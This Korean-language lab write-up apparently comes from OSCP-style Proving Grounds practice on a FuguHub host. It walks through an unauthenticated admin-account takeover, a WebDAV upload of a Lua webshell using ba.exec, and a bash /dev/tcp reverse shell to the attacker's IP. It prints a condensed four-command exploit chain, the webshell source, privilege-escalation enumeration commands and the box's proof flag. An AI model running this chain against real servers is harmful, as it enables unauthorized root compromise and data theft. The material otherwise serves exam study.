| 바이너리 자체 | 셸 획득 후 `strings /var/www/html/FuguHub \| grep -iE '[0-9]+\.[0-9]+'` | 사후 확인용. 하지만 **가장 확실**하다 |

> [!warning] 리소스 해시 비교도 실패했다
> favicon·로고 해시로 버전을 가르는 기법이 있지만 **8.0과 8.4가 바이트 동일**이라 무용지물이었다.
> 이것도 같은 함정의 변주다 — **정적 리소스는 버전이 올라가도 안 바뀌는 것이 정상**이다. 해시 비교는 "다르면 버전이 다르다"만 말해줄 뿐, **"같으면 버전이 같다"는 성립하지 않는다.**

> [!tip] 그런데 — 버전을 못 맞혀도 뚫린다
> 이 박스에서 실제로 뚫은 경로는 **버전과 무관**했다. `/Config-Wizard/`가 302를 주는 것을 보고 들어갔을 뿐이다.
> **버전 판정에 20분 이상 쓰고 있다면 방향이 틀렸다.** 버전은 "어떤 exploit을 검색할까"를 정할 때만 필요하고, **표면 열거(무인증 경로 목록)는 버전을 몰라도 된다.** 시험에서 버전이 안 잡히면 **표면 열거로 우회**하는 것이 정석이다.
> 이 노트의 [[Levram]]·[[RubyDome]]·[[Astronaut]]와 같은 "버전 판정은 독립 근거 2개" 패턴 색인에 이 박스를 넣는 이유다.

---

## 3. Foothold

### Step 1 — 관리자 계정 선점

`/Config-Wizard/wizard/SetAdmin.lsp`는 인증이 없다. 자기 자신에게 POST해서 관리자 계정을 만든다.

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -i -X POST 'http://192.168.248.25:8082/Config-Wizard/wizard/SetAdmin.lsp' \
     -d 'email=admin@hub.local&user=admin&password=password'
HTTP/1.1 200 OK
...
Administrator Account Saved
```

**자격증명 확보: `admin` / `password`** (HTTP Basic)

성공했다는 문구만 믿지 말고 **실제로 인증이 통하는지 401/200 차이로 확증**한다:

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -o /dev/null -w "%{http_code}\n" http://192.168.248.25:8082/rtl/protected/
401
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -o /dev/null -w "%{http_code}\n" -u admin:password http://192.168.248.25:8082/rtl/protected/
200
```

> [!note] `-o /dev/null -w "%{http_code}\n"` 조합
> 본문을 버리고 **상태 코드만** 뽑는다. 같은 요청을 자격증명 유무로 두 번 던져 **401 → 200** 전이를 확인하는 것이 자격증명 검증의 표준형이다.
> `-w`의 다른 유용한 변수: `%{time_total}`(time-based 판정), `%{size_download}`(응답 길이 차 판정), `%{redirect_url}`(302 추적).
> **`-o /dev/null`을 빼면** 본문이 화면을 덮어 코드가 묻힌다. **`-w`를 빼면** 코드를 보려고 `-i`+`head`를 쓰게 되어 스크립트화가 어렵다.

> [!warning] 이 공격은 **한 번만** 쓸 수 있다
> 계정을 만들고 나면 같은 페이지가 이렇게 바뀐다:
>
> ```
> <h1>User database already saved</h1>
> <li>Delete the user database file:<br/>"/var/www/html/user.dat"</li>
> ```
>
> 다시 쓰려면 `/var/www/html/user.dat`를 지워야 한다(= 이미 셸이 필요). **누가 먼저 선점하면 끝**이므로 실전이라면 이 표면을 발견한 즉시 잡아야 한다.

> [!danger] ⚠️ 자동 익스플로잇 도구 — 이 박스는 쓸 필요가 없다
> FuguHub 8.1 CVE-2023-24078(EDB 51550)은 공개 익스플로잇이 있고, Metasploit 모듈 형태로도 유통된다 `[가정 — 실측하지 않았다]`.
> **OSCP 시험에서 Metasploit은 전체 시험 중 단 1대에만 쓸 수 있다.** 이 박스 유형에 그 한 장을 소모하는 것은 낭비다.
>
> **수동 대안 = 전체 체인 4줄.** 이것이 시험 자산이다:
> ```bash
> # ① 관리자 선점
> curl -s -X POST 'http://T:8082/Config-Wizard/wizard/SetAdmin.lsp' \
>      -d 'email=a@b.c&user=admin&password=password'
> # ② 웹셸 업로드 (WebDAV PUT)
> curl -s -u admin:password -T shell.lsp http://T:8082/fs/shell.lsp
> # ③ 명령 실행
> curl -s -u admin:password --data-urlencode 'c=id' http://T:8082/shell.lsp
> # ④ 리버스셸
> curl -s -u admin:password --data-urlencode \
>      'c=setsid bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1" &' http://T:8082/shell.lsp
> ```
> 공개 exploit 스크립트를 읽을 때도 **이 4줄로 환원해서 이해**하라. 그러면 스크립트가 실패해도 손으로 이어갈 수 있다.

### Step 2 — `.lsp` 업로드로 코드 실행

Web-File-Server(`/fs/`)는 WebDAV 파일 매니저이고 **공유 루트가 웹 루트와 같다.** `PUT /fs/x.lsp` → `GET /x.lsp` 하면 LSP(Lua Server Pages)로 실행된다.

RCE 시도 전에 **서버측 실행 자체가 되는지 산술식으로 먼저 확인한다**:

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ printf '%s' '<?lsp response:write("PWNTEST=" .. tostring(7*7)) ?>' > /tmp/t1.lsp

┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -u admin:password -T /tmp/t1.lsp http://192.168.248.25:8082/fs/t1.lsp
HTTP/1.1 201 Created

┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -u admin:password http://192.168.248.25:8082/t1.lsp
PWNTEST=49
```

> [!note] 플래그 해설 — 왜 `-T`이고 왜 `printf`인가
> | 조각 | 역할 | 빼거나 바꾸면 |
> |---|---|---|
> | `-T <파일>` | HTTP **`PUT`** 으로 파일 본문을 그대로 업로드 | `-d @파일`은 `POST` + 폼 인코딩이다. **WebDAV 업로드가 안 된다** |
> | `-u admin:password` | HTTP Basic | `/fs/`는 realm `Web File Server`로 보호된다. **빼면 401** |
> | `printf '%s'` | **개행 없이** 파일 생성 | `echo`는 끝에 `\n`을 붙인다. LSP는 태그 밖 문자를 그대로 출력하므로 응답에 빈 줄이 섞여 **비교·파싱이 지저분**해진다. `echo -n`도 셸에 따라 동작이 갈린다 |
> | 업로드 `/fs/t1.lsp` → 실행 `/t1.lsp` | **경로가 다르다** | `/fs/t1.lsp`를 GET하면 **파일 매니저가 소스를 그대로 돌려준다**(실행 안 됨). 웹 루트 경로로 다시 요청해야 실행된다 |
>
> 마지막 줄이 이 단계의 핵심 함정이다. **"올렸는데 소스가 그대로 보인다"** 면 서버가 실행을 못 하는 것이 아니라 **잘못된 경로로 요청한 것**일 수 있다. 업로드 경로와 서빙 경로를 분리해서 생각하라.

`201 Created` → **서버가 새 리소스를 만들었다는 확답.** 덮어쓰기였다면 `204 No Content`가 온다. 이 코드 차이로 **파일이 이미 존재했는지**까지 알 수 있다.

### Step 3 — `io.popen` 차단 → `ba.exec()`

교과서적 Lua 웹셸은 `io.popen`을 쓰는데 FuguHub의 LSP 샌드박스는 이걸 제거해놨다:

```
field 'popen' is not callable
```

대신 **Barracuda 런타임이 노출하는 `ba.exec()`** 가 살아 있고 stdout을 캡처해 돌려준다. `pcall`로 감싸 **에러까지 응답에 찍게** 만든 것이 핵심이다 — 뭐가 왜 막혔는지 보여야 다음 수를 고른다.

```lua
<?lsp
local c = request:data("c") or "id"
local ok,a,b,cc = pcall(function() return ba.exec(c) end)
response:write("ba.exec ok="..tostring(ok).." => "..tostring(a).." | "..tostring(b).." | "..tostring(cc).."\n")
?>
```

> [!note] 이 웹셸의 각 줄이 하는 일
> | 줄 | 의미 |
> |---|---|
> | `request:data("c")` | 요청 파라미터 `c`를 읽는다. GET 쿼리스트링·POST 폼 **양쪽**에서 가져온다 |
> | `or "id"` | 파라미터가 없으면 기본값 `id`. **웹셸이 살아 있는지 파라미터 없이 확인**할 수 있게 하는 안전장치 |
> | `pcall(function() ... end)` | 예외를 잡는다. **없으면 500 + 빈 본문**이 와서 실패 원인을 못 본다 |
> | `local ok,a,b,cc` | `pcall`의 첫 반환은 성공 여부, 나머지는 감싼 함수의 **다중 반환값**. Lua 함수는 여러 값을 돌려주므로 **몇 개인지 모를 때는 넉넉히 받아 전부 찍는다** |
> | `tostring(...)` | `nil`도 문자열로 만든다. **빼면 `nil` 연결에서 또 에러**가 나 아무것도 못 본다 |
> | `.. " | " ..` | 반환값 경계를 눈으로 구분 |
>
> **이 "전부 찍기" 스타일이 미지의 런타임을 다루는 정석**이다. 깔끔한 웹셸은 API를 이미 알 때 쓰는 것이고, 모를 때는 **관측 장비**부터 만든다.

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -u admin:password -T /tmp/x.lsp http://192.168.248.25:8082/fs/x.lsp
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -u admin:password --data-urlencode 'c=id' http://192.168.248.25:8082/x.lsp
ba.exec ok=true => uid=0(root) gid=0(root) groups=0(root)
```

**이미 uid=0이다.** 여기서 열거를 계속하는 것은 전부 낭비다 — 곧바로 4장으로 넘어간다.

### Step 4 — 인터랙티브 root 셸

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ tmux new-session -d -s hub 'rlwrap nc -lvnp 4444'

┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -u admin:password --data-urlencode \
    'c=setsid bash -c "bash -i >& /dev/tcp/192.168.45.207/4444 0>&1" &' \
    http://192.168.248.25:8082/x.lsp
```

```bash
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.25] 46868
root@debian:/var/www/html# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@debian:/var/www/html# id; hostname; cat /root/proof.txt
uid=0(root) gid=0(root) groups=0(root)
debian
702262325fd3a55a2f23d49e0256571c
```

`setsid ... &`로 띄우는 이유는 웹 요청이 셸 프로세스를 물고 늘어져 HTTP 응답이 안 돌아오는 것을 피하기 위해서다. ([[Crane]]에서 겪은 "익스가 멈춘 것처럼 보이는" 현상의 예방책)

> [!note] 리버스셸 한 줄의 해부
> ```
> setsid bash -c "bash -i >& /dev/tcp/192.168.45.207/4444 0>&1" &
> ```
> | 조각 | 역할 | **빼면** |
> |---|---|---|
> | `setsid` | 새 세션·프로세스 그룹으로 분리 | 웹 요청이 끝나며 프로세스가 함께 죽거나, **부모가 자식을 기다려 HTTP 응답이 영영 안 온다** |
> | `bash -c "..."` | 리다이렉션을 해석할 셸을 명시 | `ba.exec`가 `/bin/sh`나 `execve`로 넘기면 `>&`·`/dev/tcp`가 **bash 전용 문법이라 안 먹는다** |
> | `bash -i` | 인터랙티브 셸 (프롬프트·잡컨트롤) | 프롬프트가 없어 상태 파악이 어렵다 |
> | `>& /dev/tcp/IP/PORT` | stdout+stderr를 TCP 소켓으로 | bash의 가상 파일. **`sh`에는 없다** |
> | `0>&1` | stdin도 같은 소켓에서 | **빼면 출력만 오고 명령을 못 친다** |
> | `&` | 백그라운드 | `setsid`와 함께 요청을 즉시 반환시킨다 |
> | `rlwrap` | 리스너 쪽 readline 래퍼 | 화살표 키·명령 히스토리가 안 먹는다. TTY 업그레이드 전 임시 방편 |
> | `tmux new-session -d` | 리스너를 백그라운드 세션에 | 터미널을 하나 더 안 열어도 된다. **연결이 끊겨도 세션이 살아 있다** |

> [!warning] 리버스셸이 안 붙으면 무엇을 의심하나 — 점검 순서
> 1. **명령이 애초에 실행됐나** — `c=id`로 되돌아가 확인. 안 되면 셸 문제가 아니라 RCE 문제
> 2. **`&`가 파라미터를 잘랐나** — `--data-urlencode`를 썼는지 확인. `-d`로 보내면 `0>&1`의 `&`에서 **잘린다**
> 3. **아웃바운드 포트가 막혔나** — 4444가 안 되면 **443·80·53**을 시도. ([[Hawat]]는 443만 열려 있었다)
> 4. **`bash`가 없나** — `/bin/sh`만 있는 최소 이미지면 `>&`·`/dev/tcp`가 안 먹는다. `nc -e`, `mkfifo` 방식, `python`/`perl` 원라이너로 전환
> 5. **리스너가 실제로 떠 있나** — `ss -lntp | grep 4444`
> 6. **VPN 인터페이스 IP가 맞나** — `ip a show tun0`. `eth0` IP를 쓰면 영영 안 붙는다
>
> 이 박스는 4444가 그대로 통했으므로 위 항목 중 어느 것에도 걸리지 않았다.

> [!tip] TTY 업그레이드 — `python3`가 있어서 운이 좋았다
> ```bash
> python3 -c 'import pty;pty.spawn("/bin/bash")'
> ```
> Debian 11에는 `python3`가 기본 설치라 통했다. **없을 때의 대안**:
> ```bash
> script -qc /bin/bash /dev/null      # 가장 범용
> perl -e 'exec "/bin/bash";'
> /usr/bin/expect -c 'spawn /bin/bash; interact'
> ```
> 이어서 완전한 TTY로 만들려면 (로컬 `Ctrl+Z` 후)
> ```bash
> stty raw -echo; fg
> export TERM=xterm-256color; stty rows 50 cols 200
> ```
> ([[Hawat]]은 Arch 최소 설치라 `python3`가 없어 `script`로 넘어가야 했다)

---

## 4. 권한상승

**없다.** `ba.exec`의 첫 실행이 이미 `uid=0(root)`을 돌려줬다.

### 왜 이미 root인가

```bash
root@debian:/var/www/html# cat /etc/systemd/system/fuguhub.service
[Unit]
Description=FuguHub Service
After=network.target

[Service]
ExecStart=/var/www/html/FuguHub
WorkingDirectory=/var/www/html
User=root
Group=root
Restart=always
```

`User=root` — **권한상승 단계가 아예 없는 박스**다.

> [!note] 왜 이 제품은 root로 도는가 — 그리고 왜 그게 흔한가
> FuguHub는 **8082·9999** 를 쓰므로 1024 미만 특권 포트가 필요하지도 않다. 그런데도 root다.
> 이유는 대개 셋 중 하나다:
>
> | 이유 | 설명 |
> |---|---|
> | **파일 서버 기능** | Web-File-Server가 "디스크 아무 곳이나" 공유하려면 광범위한 파일 접근이 필요하다. 개발자가 권한 설계 대신 root로 도망간 것 |
> | 특권 포트 | 80/443을 옵션으로 지원 → 항상 root로 시작 |
> | 설치 스크립트의 관성 | `systemd` 유닛 템플릿에 `User=`를 안 적으면 **기본값이 root**다. **명시적으로 쓰지 않은 결과** |
>
> 세 번째가 가장 흔하다. **`User=` 줄이 없는 유닛 파일은 root로 돈다.** 이것이 "설정 실수"의 대표형이다.

> [!tip] 셸을 잡자마자 칠 명령 5개 — 그리고 순서가 중요한 이유
> ```bash
> id                                  # ← ①  여기서 uid=0이면 나머지 4개는 불필요
> sudo -l
> find / -perm -4000 -type f 2>/dev/null
> getcap -r / 2>/dev/null
> cat /etc/crontab; ls -la /etc/cron.*
> ```
> **`id`가 1번인 이유가 이 박스다.** 이미 root인데 SUID 열거를 돌리면 몇 분을 그냥 버린다.
> 시험에서 이 습관 하나가 박스당 5~10분을 아낀다.
>
> 서비스 실행 주체를 확인하는 명령도 함께 반사로 만들어 둔다:
> ```bash
> ps -eo user,comm,args --sort=user | grep -vE '^root .*\[' | head -40
> systemctl cat <서비스명> | grep -iE '^(User|Group|ExecStart)='
> grep -rniE '^\s*(User|Group)\s*=' /etc/systemd/system/ 2>/dev/null
> ```

> [!warning] 이 패턴은 예외가 아니다
> [[Hawat]]은 nginx·php-fpm이 `user root;`로 떠서 웹셸이 곧 root였다. 구조가 **완전히 동일**하다:
> **"애플리케이션 계층에서 코드 실행을 얻었는데, 그 애플리케이션이 root로 돈다"** → 권한상승 장이 통째로 삭제된다.
>
> 반대 방향으로도 써먹어야 한다 — **웹셸을 심을 위치를 고를 수 있다면 "누가 실행하는가"부터 확인**한다. 같은 호스트에 웹서버가 둘이면 실행 uid가 다를 수 있다.

---

## 5. 플래그

```bash
root@debian:/var/www/html# find / -name local.txt 2>/dev/null
       (없음)
root@debian:/var/www/html# ls /root/
email4.txt  proof.txt
root@debian:/var/www/html# cat /root/email4.txt
MENURkBvZmZzZWMuY29t          # base64 → 0CTF@offsec.com  (미끼)
root@debian:/var/www/html# grep -vE 'nologin|false' /etc/passwd
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
offsec:x:1000:1000:,,,:/home/offsec:/bin/bash
```

| | |
|---|---|
| `proof.txt` | `702262325fd3a55a2f23d49e0256571c` |
| `local.txt` | **존재하지 않음** — 이 박스는 플래그 1개 |

`/home/offsec`은 비어 있다. 포털 진행도가 `0/1`이면 user 플래그는 없다 — `find`로 교차 확인하고 넘어간다.

> [!note] `email4.txt`는 미끼다 — 하지만 확인 비용이 0이다
> base64 디코딩 결과가 이메일 주소일 뿐 아무 데도 안 쓰인다. 그래도 **디코딩은 해봐야 한다** — `echo <문자열> | base64 -d`는 1초다.
> **"미끼인지 아닌지는 열어보기 전에는 모른다."** 판단 기준은 내용이 아니라 **비용**이다. 1초면 열고, 10분이면 다른 경로를 먼저 본다.

> [!tip] 시험 증거 형식 연습
> PG는 `proof.txt` 값만 제출하면 되지만 **실제 시험은 스크린샷이 필요**하고, 아래가 한 화면에 있어야 인정된다:
> ```bash
> whoami; hostname; ip a; cat /root/proof.txt
> ```
> 이 박스에서는 `id; hostname; cat /root/proof.txt`를 한 줄로 쳤다. **시험에서는 `ip a`(또는 `ip addr show`)를 반드시 포함**한다 — 채점자가 대상 호스트임을 확인하는 근거다.
> 플래그를 잡은 직후, 셸을 잃기 전에 찍어라. 리버스셸은 언제든 끊긴다.

---

## 6. 막혔던 지점 / 시행착오

### ① 버전 판정 — 3중 근거가 3중으로 틀렸다 (실제로 겪음)

이 박스에서 실제로 시간을 태운 유일한 지점이다.

진행 순서는 이랬다:

```
80/tcp readme.txt 발견  →  "Changes for 8.0  July 2019"
                        →  SSL 인증서 Not valid before: 2019-07-16  (일치!)
                        →  8082 인덱스 Last-Modified: 2019-07-19    (일치!)
                        →  "8.0이 확실하다" 로 결론
                        →  8.0 대상 exploit 검색 · 리소스 해시 비교 시도
                        →  전부 헛수고
                        ↓
          인증 확보 후 /rtl/about.lsp  →  "FuguHub 8.4"
```

**무엇이 잘못됐나**: 근거를 *세었지* *검증하지* 않았다. 셋은 전부 **2019년 배포 아카이브라는 단일 출처**에서 나온 값이었고, 실행 중인 바이너리와는 아무 관계가 없었다.

**어떻게 알아챘나**: 관리자 계정을 선점한 뒤 인증이 필요한 경로가 열렸고, 거기서 앱이 **런타임에 렌더한** About 페이지를 읽으면서 뒤집혔다.

**교훈 — 두 갈래**:

1. **인식론적으로**: 일치하는 근거의 *개수*는 신뢰도가 아니다. **생성 경로가 서로 다른 근거**만이 독립 증거다. (상세 절차는 [2-6](#2-6-버전-판정의-인식론--근거의-개수가-아니라-독립성))
2. **절차적으로**: **자격증명을 확보한 직후 가장 먼저 할 일이 About/버전 페이지 확인**이다. 무인증 상태에서 내린 버전 판정은 전부 잠정으로 취급하고, 인증이 열리는 순간 재검증한다.

> [!danger] 리소스 해시로 버전을 가르려던 시도도 실패했다
> favicon·로고를 8.0 배포본과 비교했지만 **바이트 동일**이었다.
> 이것은 실패가 아니라 **애초에 성립하지 않는 방법**이었다. 정적 리소스는 버전이 올라가도 안 바뀌는 것이 정상이다.
> **해시 비교는 "다르면 다르다"만 증명하고 "같으면 같다"는 증명하지 못한다.** 비대칭이라는 것을 알고 써야 한다.

### ② 랩 브리핑이 틀렸다 — 그런데 그게 문제가 아니었다 (실제로 겪음)

랩 문서는 이 박스를 **8.1 / CVE-2023-24078**로 안내한다. 실제는 **8.4**다. CVE도 8.4 계열이면 **CVE-2024-27697**이 맞다.

여기서 "CVE 번호가 안 맞으니 다른 취약점인가" 하고 흔들릴 수 있는데, **악용 체인은 동일했다**:

```
/Config-Wizard/wizard/SetAdmin.lsp 무인증 → 관리자 선점 → WebDAV .lsp 업로드 → RCE
```

> [!tip] 제공된 힌트가 틀렸을 때의 대처
> 시험이든 랩이든 **브리핑·힌트·CVE 번호는 "출발점"이지 "사실"이 아니다.**
> - CVE 번호가 안 맞으면 → **번호를 버리고 메커니즘으로 검색**한다. `FuguHub unauthenticated admin` / `Barracuda web server lsp upload rce` 같은 식
> - 버전이 안 맞으면 → **인접 버전의 exploit도 읽어본다.** 같은 코드베이스면 패치 안 된 경로가 남아 있다
> - **exploit 코드를 "실행"하기 전에 "읽어서" 어떤 HTTP 요청을 보내는지 파악**한다. 그러면 버전이 달라도 손으로 이어갈 수 있다
>
> 이 박스가 정확히 그 사례다 — **8.1용 exploit을 읽고 요청 4개로 환원했더니 8.4에서 그대로 통했다.**

### ③ 9999 스캔 결과 50여 건이 통째로 위양성이었다 (실제로 겪음)

BarracudaServer는 존재하지 않는 경로에도 302를 준다. `/2009`, `/App_Data`, `/fileadmin`, `/downloader`, `/openx` … 전부 가짜였다.

**얼마나 걸렸나**: 스캔 시간 + 50여 개 경로를 하나씩 확인하는 시간. **전부 낭비였다.**

**어떻게 알아챘나**: 아무 문자열이나 던져봤더니 그것도 302였다.

```bash
└─$ curl -s -o /dev/null -w "%{http_code}\n" http://192.168.248.25:9999/nonexistent-abc123
302
```

> [!danger] 모든 웹 fuzz 전에 30초를 투자하라 — 베이스라인 측정
> ```bash
> # 1. 존재할 리 없는 경로 3개로 서버의 "없음" 응답을 확정
> for p in nonexistent-abc123 zzz-$RANDOM .well-known/zzz; do
>   curl -s -o /dev/null -w "%{http_code} %{size_download} $p\n" "http://TARGET:PORT/$p"
> done
> ```
> 결과에 따라 필터를 정한다:
> - 전부 **302** → `-C 302` (feroxbuster) / `-b 302` 제외 (gobuster)
> - 전부 **200인데 길이가 같음** → 길이로 필터. `--filter-size <n>` / `-fs <n>` (ffuf)
> - 전부 **404** → 정상. 필터 불필요
> - **경로마다 길이가 다름**(경로 문자열을 에코) → 길이 필터가 안 먹는다. **정규식으로 본문 필터** (`ffuf -fr`)
>
> **이 30초가 이 박스에서 수십 분을 아꼈을 것이다.**

### ④ `io.popen`이 죽어 있었다 (실제로 겪음)

교과서적 Lua 웹셸이 그대로 실패했다:

```
field 'popen' is not callable
```

**어떻게 넘어갔나**: `pcall`로 감싸 에러 메시지를 응답 본문에 노출시키고, 제품 고유 API인 `ba.exec()`를 시도했다.

이 단계에서 중요한 판단은 **"샌드박스니까 안 되겠다"로 끝내지 않은 것**이다. 표준 라이브러리가 잘린 것은 오히려 **"제품 확장 API는 안 잘렸을 것"** 의 신호였다.

> [!tip] 실행 함수가 막혔을 때의 후보 사다리 — 언어별
> | 언어 | 1순위 | 막혔을 때 후보 |
> |---|---|---|
> | **Lua/LSP** | `io.popen` | `os.execute` · **`ba.exec`(Barracuda)** · `require("os")` 재획득 · `load()`로 동적 평가 |
> | PHP | `system` | `exec` `shell_exec` `passthru` `popen` `proc_open` `` ` `` `preg_replace /e` · `disable_functions` 우회 |
> | Python | `os.system` | `subprocess.*` · `os.popen` · `__import__('os')` · `eval`/`exec` |
> | Java/JSP | `Runtime.exec` | `ProcessBuilder` · `ScriptEngine` |
> | Node | `child_process.exec` | `execSync` `spawn` · `process.binding` |
>
> **공통 절차는 하나다**: ① 예외를 잡아 응답에 노출 → ② 후보를 목록으로 순회 → ③ 살아 있는 것을 쓴다.

### ⑤ 80/tcp를 403이라고 버릴 뻔했다 (실제로 겪음)

nmap이 `http-title: 403 Forbidden`을 뱉었다. 그런데 그 뒤에 **설치 디렉터리가 통째로** 있었다 — `bdd.conf`(설치 경로·포트), `user.dat`, `Config-Wizard.zip`, `readme.txt`.

**놓칠 뻔한 이유**: 루트가 403이면 "인덱싱 금지 = 볼 것 없음"으로 반사적으로 넘어가게 된다. 실제로는 **autoindex만 꺼졌고 파일은 전부 서빙**됐다.

> [!warning] 확장자 목록을 좁게 잡아 두 번 놓쳤다
> feroxbuster를 `-x php,txt,html,lsp`로 돌렸다. **`conf`도 `dat`도 없다.**
> 그래서 이 박스의 핵심 정보(`bdd.conf`, `user.dat`)는 그 스캔 결과에 아예 없었다. **확장자를 넓혀 다시 긁어서야 나왔다.**
>
> 재발 방지:
> ```bash
> # 1차 — 빠르게, 언어 확장자
> feroxbuster -u http://T/ -w raft-medium-directories.txt -x php,html,lsp -C 302
> # 2차 — 설정·데이터 확장자로 다시 (여기가 정보 유출의 서식지)
> feroxbuster -u http://T/ -w raft-medium-files.txt \
>   -x conf,cfg,ini,env,json,yml,yaml,xml,dat,db,sql,bak,old,zip,log -C 302
> ```
> `json`을 특히 잊지 마라 — `composer.json`·`package.json`·`config.json`은 **버전 판정 2순위 근거**의 주 서식지다. 이 박스는 그 계층이 없어서(C 바이너리 제품) 버전 판정이 유독 어려웠다.

### ⑥ `user.dat`을 크랙하려던 시도 (실제로 겪음 — 막다른 길)

80/tcp에서 **FuguHub의 사용자 DB인 `user.dat`(467바이트)이 그대로 다운로드**됐다. "여기서 관리자 해시를 뽑아 크랙하면 되겠다"는 것이 자연스러운 다음 수였다.

**막혔다.** `user.dat`은 **FuguHub 자체 암호화 포맷**이라 `/etc/shadow`나 htpasswd처럼 `$1$`·`$6$`·`$apr1$` 같은 **인식 가능한 해시 문자열이 없다.** `john`·`hashcat`에 넣을 모드 자체가 없다.

**어떻게 알아챘나**: 파일을 열어보고 알려진 해시 접두사가 하나도 없다는 것을 확인한 순간. **크랙을 시작하기 전이었다.**

> [!warning] 크리덴셜 파일을 얻었을 때의 손절 판단 — 30초 안에 끝난다
> ```bash
> file user.dat && wc -c user.dat && strings -n 6 user.dat | head -20
> grep -aoE '\$[0-9a-z]{1,6}\$[^:]{8,}' user.dat        # 알려진 해시 접두사
> xxd user.dat | head -5                                 # 매직 바이트 / 구조
> ```
> 판정:
> - **알려진 해시 형식이 보인다** → `hashid`/`hash-identifier`로 모드 확정 후 크랙 진행
> - **base64/hex 덩어리** → 디코드해서 다시 판정
> - **구조를 알 수 없는 바이너리** → **즉시 손절.** 제품 고유 포맷은 소스나 리버싱 없이는 못 푼다
>
> 이 박스는 세 번째였다. **여기서 "그래도 혹시" 하며 hashcat 모드를 하나씩 돌려봤다면 시간을 통째로 날렸을 것이다.**

그런데 **버린 것은 아니다.** 이 파일은 두 가지로 여전히 유용했다:

1. **설치 경로 확정** — `user.dat`이 80에서 읽힌다는 사실 자체가 nginx 문서 루트 = `/var/www/html` = FuguHub 설치 디렉터리임을 확증한다.
2. **회수 채널** — 셸을 잡은 뒤 `/var/www/html/`에 파일을 떨구면 **80/tcp로 그냥 다운로드**된다. 아웃바운드가 막힌 환경에서 데이터를 빼내는 경로가 된다.

> [!tip] "크랙 불가"와 "쓸모 없음"은 다르다
> 크리덴셜 파일이 안 풀리더라도 **① 경로 정보 ② 사용자명 목록 ③ 파일이 읽힌다는 사실이 함의하는 접근 범위**는 남는다.
> 특히 ③이 중요하다 — **"이 경로의 파일이 웹으로 읽힌다"는 것은 곧 "이 경로에 쓸 수 있으면 웹으로 회수된다"** 는 뜻이다. 업로드 RCE와 데이터 반출 양쪽의 전제가 된다.

### ⑦ 이 유형에서 흔히 막히는 지점 (원문에 실측 기록 없음 — 일반 사례)

> [!note] 아래는 이 박스에서 실제로 겪은 것이 아니라, **같은 유형에서 반복적으로 보고되는 함정**이다. 구분해서 읽을 것.

| 증상 | 원인 | 대처 |
|---|---|---|
| `SetAdmin.lsp`가 `User database already saved`를 반환 | **이미 누가 선점**했거나 관리자가 설정을 마침 | 이 경로는 죽었다. `user.dat` 삭제에는 셸이 필요하므로 **다른 진입점**을 찾아야 한다 |
| 업로드는 `201`인데 GET하면 소스가 그대로 보임 | **업로드 경로로 GET**했다 (`/fs/x.lsp`) | 웹 루트 경로(`/x.lsp`)로 요청 |
| 업로드는 되는데 어느 경로로도 안 보임 | WebDAV 공유 루트가 **웹 루트 밖** | 공유 루트 경로를 찾는다. 여기서는 `bdd.conf`의 `drivedir=` 가 그 단서 |
| 확장자를 `.lsp`로 올렸는데 실행 안 됨 | 해당 디렉터리에 **스크립트 실행이 비활성** | 다른 디렉터리로 옮겨본다(`MOVE` 메서드). 또는 실행되는 디렉터리를 실행 파일 하나로 탐지 |
| `PUT`이 `403`/`405` | WebDAV가 **읽기 전용**이거나 realm이 다름 | `OPTIONS`를 **그 경로에** 다시 걸어 확인. 루트의 `Allow`와 하위 경로의 `Allow`가 다를 수 있다 |
| `c=id`는 되는데 리버스셸이 안 붙음 | `-d`로 보내 `0>&1`의 `&`에서 **잘림** | `--data-urlencode` 사용 |
| 명령을 넣으면 HTTP가 영영 안 끝남 | 셸 프로세스를 **부모가 기다림** | `setsid ... &` |

### ⑧ 시간 배분 — 어디서 손절했어야 하는가

| 단계 | 실제 소요감 | 적정선 | 판단 |
|---|---|---|---|
| nmap `-p-` | ~3분 | ~3분 | 적정. `--min-rate 5000`이 정답 |
| **버전 판정** | **길었다** | **10분** | ❌ **여기가 유일한 낭비.** 3중 근거에 만족한 것이 원인 |
| 9999 fuzz + 위양성 확인 | 길었다 | **0분** | ❌ **베이스라인 30초면 통째로 회피 가능** |
| 무인증 표면 열거 | 짧음 | ~10분 | ✅ 여기서 `/Config-Wizard/`가 나왔다 |
| 관리자 선점 → RCE → root | 짧음 | ~10분 | ✅ 체인 자체는 4요청 |

> [!danger] 이 박스의 손절 규칙 — 한 줄로
> **"버전을 못 맞혀도 표면 열거는 된다."**
> 버전 판정에 **10분** 이상 쓰고 있다면 즉시 중단하고 **무인증 경로 열거로 전환**하라. 이 박스의 정답 경로는 버전을 몰라도 `/Config-Wizard/` 302 하나로 찾을 수 있었다.
>
> 마찬가지로 **fuzz 결과가 수십 건 쏟아지면 그것은 발견이 아니라 위양성 신호**다. 하나씩 확인하기 전에 베이스라인부터 재라.

---

## 7. OSCP 시험 관점

1. **버전 증거에는 신뢰 순위가 있다.** 앱이 렌더하는 About 페이지 > 서버/API 버전 필드 > 패키지 메타데이터 > **정적 changelog·readme**. 이 박스는 `readme.txt`(8.0) + SSL 인증서 날짜 + `Last-Modified`가 **3중으로 일치하며 틀렸다.** 증거가 여러 개 일치해도 **출처가 같으면(2019년 배포본 잔존물) 독립 증거가 아니다.**

2. **독립성 검사를 30초 절차로 반사화하라.** 각 근거에 대해 ① *누가 언제 만든 값인가*(빌드 시점 = 정적 / 요청 시점 = 동적) ② *같은 아카이브에서 나왔나* ③ *업그레이드 때 갱신되나*. **셋 다 통과한 근거만 센다.**

